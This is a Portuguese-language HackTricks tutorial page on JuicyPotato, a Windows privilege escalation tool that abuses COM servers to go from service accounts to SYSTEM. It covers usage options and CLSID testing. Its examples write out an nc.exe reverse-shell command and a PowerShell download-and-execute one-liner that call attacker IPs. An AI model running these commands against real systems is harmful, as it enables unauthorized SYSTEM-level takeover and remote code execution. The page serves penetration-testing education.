# JuicyPotato

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>
{% endhint %}

{% hint style="warning" %}
**JuicyPotato não funciona** no Windows Server 2019 e no Windows 10 build 1809 em diante. No entanto, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) podem ser usados para **aproveitar os mesmos privilégios e obter acesso ao nível `NT AUTHORITY\SYSTEM`**. _**Verifique:**_
{% endhint %}

{% content-ref url="roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](roguepotato-and-printspoofer.md)
{% endcontent-ref %}

## Juicy Potato (abusando dos privilégios dourados) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Uma versão adoçada do_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, com um pouco de suco, ou seja, **outra ferramenta de Escalação de Privilégios Locais, de Contas de Serviço do Windows para NT AUTHORITY\SYSTEM**_

#### Você pode baixar juicypotato de [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Resumo <a href="#summary" id="summary"></a>

[**Do Readme do juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) e suas [variantes](https://github.com/decoder-it/lonelypotato) aproveitam a cadeia de escalonamento de privilégios baseada no [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [serviço](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) tendo o ouvinte MiTM em `127.0.0.1:6666` e quando você tem privilégios `SeImpersonate` ou `SeAssignPrimaryToken`. Durante uma revisão de build do Windows, encontramos uma configuração onde `BITS` foi intencionalmente desativado e a porta `6666` foi ocupada.

Decidimos armar [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Diga olá para Juicy Potato**.

> Para a teoria, veja [Rotten Potato - Escalação de Privilégios de Contas de Serviço para SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) e siga a cadeia de links e referências.

Descobrimos que, além de `BITS`, existem vários servidores COM que podemos abusar. Eles só precisam:

1. ser instanciáveis pelo usuário atual, normalmente um “usuário de serviço” que tem privilégios de impersonação
2. implementar a interface `IMarshal`
3. rodar como um usuário elevado (SYSTEM, Administrador, …)

Após alguns testes, obtivemos e testamos uma lista extensa de [CLSID’s interessantes](http://ohpe.it/juicy-potato/CLSID/) em várias versões do Windows.

### Detalhes suculentos <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato permite que você:

* **CLSID de destino** _escolha qualquer CLSID que você quiser._ [_Aqui_](http://ohpe.it/juicy-potato/CLSID/) _você pode encontrar a lista organizada por SO._
* **Porta de escuta COM** _defina a porta de escuta COM que preferir (em vez da 6666 codificada)_
* **Endereço IP de escuta COM** _vincule o servidor a qualquer IP_
* **Modo de criação de processo** _dependendo dos privilégios do usuário impersonado, você pode escolher entre:_
* `CreateProcessWithToken` (precisa de `SeImpersonate`)
* `CreateProcessAsUser` (precisa de `SeAssignPrimaryToken`)
* `ambos`
* **Processo a ser iniciado** _inicie um executável ou script se a exploração for bem-sucedida_
* **Argumento do Processo** _personalize os argumentos do processo iniciado_
* **Endereço do Servidor RPC** _para uma abordagem furtiva, você pode se autenticar em um servidor RPC externo_
* **Porta do Servidor RPC** _útil se você quiser se autenticar em um servidor externo e o firewall estiver bloqueando a porta `135`…_
* **MODO DE TESTE** _principalmente para fins de teste, ou seja, testando CLSIDs. Ele cria o DCOM e imprime o usuário do token. Veja_ [_aqui para testes_](http://ohpe.it/juicy-potato/Test/)

### Uso <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Considerações finais <a href="#final-thoughts" id="final-thoughts"></a>

[**Do juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

Se o usuário tiver privilégios `SeImpersonate` ou `SeAssignPrimaryToken`, então você é **SYSTEM**.

É quase impossível prevenir o abuso de todos esses Servidores COM. Você poderia pensar em modificar as permissões desses objetos via `DCOMCNFG`, mas boa sorte, isso vai ser desafiador.

A solução real é proteger contas e aplicações sensíveis que rodam sob as contas `* SERVICE`. Parar o `DCOM` certamente inibiria esse exploit, mas poderia ter um impacto sério no sistema operacional subjacente.

De: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## Exemplos

Nota: Visite [esta página](https://ohpe.it/juicy-potato/CLSID/) para uma lista de CLSIDs para tentar.

### Obter um shell reverso nc.exe
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Inicie um novo CMD (se você tiver acesso RDP)

![](<../../.gitbook/assets/image (300).png>)

## Problemas de CLSID

Muitas vezes, o CLSID padrão que o JuicyPotato usa **não funciona** e a exploração falha. Normalmente, leva várias tentativas para encontrar um **CLSID funcional**. Para obter uma lista de CLSIDs para tentar em um sistema operacional específico, você deve visitar esta página:

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **Verificando CLSIDs**

Primeiro, você precisará de alguns executáveis além do juicypotato.exe.

Baixe [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) e carregue-o em sua sessão PS, e baixe e execute [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Esse script criará uma lista de possíveis CLSIDs para testar.

Em seguida, baixe [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat)(mude o caminho para a lista de CLSID e para o executável juicypotato) e execute-o. Ele começará a tentar cada CLSID, e **quando o número da porta mudar, isso significará que o CLSID funcionou**.

**Verifique** os CLSIDs funcionais **usando o parâmetro -c**

## Referências

* [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)


{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
